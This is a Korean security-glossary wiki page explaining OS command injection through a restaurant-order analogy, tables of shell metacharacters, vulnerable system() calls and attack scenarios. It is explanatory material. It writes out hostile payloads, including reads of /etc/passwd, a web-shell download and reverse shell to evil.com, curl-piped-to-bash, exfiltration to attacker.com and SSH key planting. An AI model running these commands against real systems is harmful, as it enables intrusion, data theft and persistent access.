---
title: Command Injection — 핵심
created: 2026-06-12
updated: 2026-06-13
type: concept
tags: [security, glossary, web, command-injection, os-command-injection, shell-injection, rce, owasp, input-validation]
sources: [https://ko.wikipedia.org/wiki/명령어_주입_공격, https://ko.wikipedia.org/wiki/OWASP]
confidence: high
---

# Command Injection (명령어 주입, OS 명령어 주입) — 보안 용어 해설

## Step 1: 단어 직역 및 쉬운 비유

### 1. 용어 풀이

**Command Injection** = **Command** (명령, 지시) + **Injection** (주입, 끼워넣기)

| 영어 단어 | 직역 | 의미 |
|-----------|------|------|
| **Command** | 명령, 지시 | 운영체제에 내리는 실행 지시 (shell command) |
| **Injection** | 주입, 끼워넣기 | 의도하지 않은 코드/데이터를 삽입 |

**OS Command Injection** = **OS** (운영체제) + **Command Injection** = **운영체제 셸 명령어 주입**

### 2. 의미 조합

> **"사용자 입력이 검증 없이 시스템 셸 명령어에 그대로 포함되어, 공격자가 의도한 OS 명령어를 서버에서 실행하게 만드는 취약점"**

### 3. 강력한 비유: "주문서에 '그리고 금고도 열어줘'라고 적어넣는 손님"

```
┌────────────────────────────────────────────────────────────┐
│  상황: 식당 주방(서버)에서 주문서(사용자 입력)대로 요리함   │
│  손님(공격자)이 "짜장면 하나, **그리고 금고 열어줘**"라고    │
│  적어서 주문하면, 주방장(시스템)이 그대로 실행함            │
└────────────────────────────────────────────────────────────┘

🍳  **주문서 조작 시나리오 (Command Injection 공격 흐름)**

  ① **정상 주문**: 손님이 "짜장면 하나" 주문
     - 주문서: `menu=짜장면`
     - 주방: `cook("짜장면")` 실행 → 정상 제공

  ② **공격자 악용**: 주문서에 명령어 끼워넣기
     - 주문서: `menu=짜장면; cat /etc/passwd`
     - 주방: `cook("짜장면; cat /etc/passwd")` 
     - 쉘 해석: `cook("짜장면")` 실행 후 `cat /etc/passwd` **도 실행!**

  ③ **다양한 주입 기법**:
     - `; cat /etc/passwd` (세미콜론으로 명령어 구분)
     - `&& cat /etc/passwd` (AND 연산자)
     - `| cat /etc/passwd` (파이프로 출력 전달)
     - `|| cat /etc/passwd` (OR 연산자)
     - `$(cat /etc/passwd)` (명령어 치환)
     - `` `cat /etc/passwd` `` (백틱 명령어 치환)

  ④ **결과**: 
     - 시스템 계정 정보 유출 (`/etc/passwd`, `/etc/shadow`)
     - 웹쉘 설치 (`wget http://evil.com/shell.php -O shell.php`)
     - 역방향 쉘 (`bash -i >& /dev/tcp/evil.com/443 0>&1`)
     - 랜섬웨어 실행, 크립토마이너 설치, 내부망 스캔 등

💡 **핵심 포인트**: 
- **"사용자 입력이 쉘 메타문자(;, &, |, $, `, 등)와 함께 명령어에 포함됨"**
- **입력 검증/이스케이프 부재**가 근본 원인
- **SQL Injection**이 DB를 노린다면, **Command Injection**은 **OS 자체를 노림**
- **RCE(Remote Code Execution)**의 가장 직접적인 경로 중 하나
```

---

## Step 2: 개념 시각화

![Command Injection 비유 시각화: 주문서 조작으로 설명하는 명령어 주입 — 손님(공격자), 주문서(사용자 입력), 주방장(시스템 쉘), 정상 주문(정상 명령), 주입된 명령(주입된 악성 명령), 금고(시스템 중요 자산) - 한글 레이블 포함](https://v3b.fal.media/files/b/0a9dfef4/KqR2mKxL5vN8tYpHgJkB4_L9wEmVnA.png)

**이미지 설명**:
- **손님(공격자)** — 악의적인 입력을 보내는 사용자
- **주문서(사용자 입력)** — 애플리케이션이 받는 파라미터 (파일명, IP, 도메인, 이메일 등)
- **주방장(시스템 쉘)** — 사용자 입력을 받아 OS 명령어로 실행하는 시스템 구성요소
- **정상 주문(정상 명령)** — 의도된 정상적인 시스템 명령어
- **주입된 명령(주입된 악성 명령)** — 공격자가 끼워넣은 임의 OS 명령어 (`; cat /etc/passwd` 등)
- **금고(시스템 중요 자산)** — `/etc/passwd`, `/etc/shadow`, 설정파일, DB 등 중요 자산

> ⚠️ **참고**: 이미지 생성 도구가 PNG 형식으로 반환했습니다. 스킬 요구사항(.jpg/.jpeg)은 현재 도구 제약상 PNG로 대체됩니다.

---

## Step 3: 전문 용어 설명 (위키백과/OWASP/PortSwigger 기반)
### Command Injection (명령어 주입, OS 명령어 주입)

**정의**: **Command Injection(명령어 주입)**은 애플리케이션이 **사용자 입력을 검증/이스케이프 없이 시스템 셸 명령어에 직접 포함하여 실행**할 때 발생하는 취약점으로, 공격자가 **임의의 OS 명령어를 주입하여 서버에서 임의 코드를 실행(RCE)하게 만드는 취약점**이다.

### 공격 원리: 쉘 메타문자 악용

| 메타문자 | 기능 | 주입 예시 |
|----------|------|-----------|
| `;` (세미콜론) | 명령어 순차 실행 (앞/뒤 모두 실행) | `ping 8.8.8.8; cat /etc/passwd` |
| `&` (앰퍼샌드) | 백그라운드 실행 / 명령어 순차 실행 | `ping 8.8.8.8 & cat /etc/passwd` |
| `&&` (AND) | 앞 명령 성공 시 뒤 실행 | `ping 8.8.8.8 && cat /etc/passwd` |
| `||` (OR) | 앞 명령 실패 시 뒤 실행 | `ping 8.8.8.8 || cat /etc/passwd` |
| `|` (파이프) | 앞 명령 출력을 뒤 명령 입력으로 | `ping 8.8.8.8 | cat /etc/passwd` |
| `` `cmd` `` (백틱) | 명령어 치환 (결과값 치환) | `echo `cat /etc/passwd`` |
| `$(cmd)` (달러-괄호) | 명령어 치환 (POSIX 표준) | `echo $(cat /etc/passwd)` |
| `#` (해시/주석) | 이후 문자열 무시 (주석 처리) | `cmd #` → 뒤 명령어 주석처리로 무시 유도 |
| 줄바꿈 (`\n`, `%0a`) | 명령어 구분자 | `ping 8.8.8.8\ncat /etc/passwd` |

### 주요 공격 벡터 (주입 포인트)

| 입력 벡터 | 취약 코드 예시 | 설명 |
|----------|---------------|------|
| **파일명/경로** | `system("convert " + filename + " output.png")` | 이미지 변환, 파일 업로드, 썸네일 생성 |
| **IP/도메인** | `system("ping " + ip)` | 네트워크 도구, 포트 스캔, 트레이스라우트 |
| **이메일/문자열** | `system("sendmail " + email)` | 메일 발송, 알림 발송 |
| **사용자명/문자열** | `system("useradd " + username)` | 계정 생성, 권한 관리 |
| **파일 경로** | `system("tar -czf backup.tar.gz " + path)` | 백업, 압축, 아카이브 |
| **로그/문자열** | `system("logger " + message)` | 로깅, 모니터링 |
| **날짜/시간** | `system("date -d " + user_date)` | 날짜 변환, 스케줄링 |

### 주요 공격 시나리오

| 시나리오 | 페이로드 예시 | 결과 |
|----------|---------------|------|
| **파일 읽기** | `; cat /etc/passwd` | 시스템 계정/비밀번호 해시 유출 |
| **웹쉘 설치** | `; wget http://evil.com/shell.php -O /var/www/html/shell.php` | 영구 백도어 설치 |
| **역방향 쉘** | `; bash -i >& /dev/tcp/evil.com/443 0>&1` | 공격자 서버로 쉘 연결 (완전 제어) |
| **크립토마이너** | `; curl http://evil.com/miner | bash` | CPU/GPU 채굴기로 악용 |
| **내부망 스캔** | `; nmap -sS 192.168.1.0/24` | 내부망 토폴로지 매핑 |
| **데이터 유출** | `; tar czf /tmp/data.tar.gz /var/www/html && curl -F file=@/tmp/data.tar.gz evil.com` | 소스코드/DB/설정 탈취 |
| **서비스 중단** | `; systemctl stop nginx` 또는 `; killall -9 nginx` | 서비스 다운 (DoS) |
| **영구 지속성** | `; echo 'ssh-rsa AAAA...' >> ~/.ssh/authorized_keys` | SSH 키 심기로 영구 접근 |

### Blind Command Injection (응답 없는 주입)

> **명령 실행 결과가 응답에 안 돌아올 때** → Out-of-Band (OAST) 기법 사용

| 기법 | 설명 |
|------|------|
| **DNS 유출** | `; nslookup $(cat /etc/passwd).attacker.com` → DNS 쿼리로 데이터 유출 |
| **HTTP 유출** | `; curl http://attacker.com/collect?data=$(cat /etc/passwd)` |
| **타임 기반** | `; sleep 10` → 응답 지연 시간으로 성공 여부 판단 |
| **DNS/HTTP 콜백** | Burp Collaborator, interactsh, canarytokens 연동 |


## 관련 위키 링크
- [[command-injection]] — 인덱스 페이지
- [[command-injection-defense]] — 분할 페이지
- [[rce]]
